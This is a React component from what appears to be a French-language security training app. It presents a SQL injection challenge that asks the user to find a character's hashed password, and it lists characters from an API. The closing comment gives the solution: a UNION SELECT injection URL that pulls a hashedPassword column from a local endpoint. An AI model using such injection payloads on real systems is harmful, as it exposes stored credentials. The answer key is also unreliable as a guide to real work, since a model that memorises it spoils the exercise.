import React from "react"
import { Card, CardDescription, CardTitle, Row } from "@dataesr/react-dsfr";
import { useQuery } from "react-query";
import { getCharacters } from "../../api";
import { Challenge, Link } from "../../components";
import { routes } from "../../routes";

export { ChallengeSQLInjection2 }

type characterType = { id: number, name: string }

function ChallengeSQLInjection2() {
    const query = useQuery<unknown, unknown, characterType[]>('challengeSQLInjection2', async () => { const { data } = await getCharacters(); return data })

    return <Challenge challengeName="challengeSQLInjection2">
        <Row>
            <p>Pour ce challenge, il s'agit de trouver la version hach√©e du mot de passe de M. Lermite</p>
        </Row>
        <Row>
            <Card>
                <CardTitle>
                    Liste des personnages
                </CardTitle>
                <CardDescription>
                    {renderCardContent()}
                </CardDescription>
            </Card>
        </Row>
    </Challenge>

    function renderCardContent() {
        if (query.data) {
            return query.data.map((character, index) => <span key={character.name + index}>
                <Link text={character.name} to={routes["character"].getPath({ id: `${character.id}` })} />
                <br />
            </span>)

        }
        if (query.isLoading) {
            return "Chargement..."
        }
        return "Une erreur est survenue."
    }
}

// Solution : http://localhost:3001/api/characters/16%20UNION%20SELECT%20id,%20hashedPassword%20FROM%20characters%20WHERE%20id=15